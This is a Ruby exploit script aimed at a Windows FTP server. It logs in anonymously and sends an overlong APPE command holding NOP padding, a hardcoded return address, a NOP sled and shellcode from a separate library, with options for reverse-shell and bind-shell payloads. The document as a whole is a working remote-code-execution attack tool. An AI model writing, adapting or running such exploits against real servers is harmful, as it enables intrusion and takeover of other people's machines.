#!/usr/bin/env ruby

require 'optparse'
require 'socket'
require_relative 'lib/w32shellcode'

class BasicFtp
  
  def initialize(host, port)
    @host, @port = host, port
  end

  def connect(verbose=false)
    @tcp = TCPSocket.new(@host, @port)
    @banner = @tcp.gets
    puts @banner if verbose
  end
  
  def login(user, pass, verbose=false)
    response = command("USER #{user}\r\n", verbose)
    response = command("PASS #{user}\r\n", verbose)
    response = @tcp.gets
    puts response if verbose
  end

  def command(command, verbose=false)
    puts command if verbose
    @tcp.write("#{command}\r\n")
    response = @tcp.gets
    puts response if verbose
  end

end


class Payload
  include W32shellcode
  def initialize ( beforepad = "\x90"*966,
                   ret       = "\x0A\xAF\xD8\x77",
                   nopsled   = "\x90"*21, 
                   afterpad  = "\x90"*50)    
    $beforepad, $ret, $nopsled, $afterpad = beforepad, ret, nopsled, afterpad
  end

  def return(type)
    shellcode = eval "W32shellcode::#{type.upcase}"
    shellcode = $beforepad + $ret + $nopsled + shellcode + $afterpad
  end

end   

  
options = {}
options[:user]      = 'anonymous'
options[:pass]      = 'anonymous@example.com'
options[:shellcode] = 'revsht'

op = OptionParser.new do |opt|
  opt.banner = "Usage: #{File.basename($0)} [options] ftp-host[:port]"
  opt.separator("\nWhere available options:")
  opt.on("-u", "--user USER", "FTP Username")                    { |o| options[:user]         = o }
  opt.on("-p", "--pass PASS", "FTP Password")                    { |o| options[:pass]         = o }
  opt.on("-s", "--shellcode TYPE", "Shellcode to inject
      Where TYPE can be:
                          simple
                          pattern
                          revshp
                          revsht
                          bind")                                 { |o| options[:shellcode]    = o }
  opt.on("-w", "--winver", "Windows version")                    { |o| options[:winver]       = o }
  opt.on("-v", "--verbose", "Verbose output")                    { options[:verbose] = true       }
  opt.on("-h", "--help", "Show this help")                       { puts opt; exit 1               }
  if ARGV.empty? 
    puts opt
    exit 1
  end
end
op.parse!

host, port = ARGV.pop.to_s.split(/:/)
port = 21 if port.nil?
shellcode = W32shellcode::PATTERN

ftp = BasicFtp.new(host, port)
ftp.connect(options[:verbose])
ftp.login(options[:user], options[:pass], options[:verbose])
 
begin
  puts '[*] Deliverying the payload...'
  ftp.command('APPE ' + Payload.new.return(options[:shellcode]), true)
rescue Exception => e
  p e
  puts '[!!] No response'
end
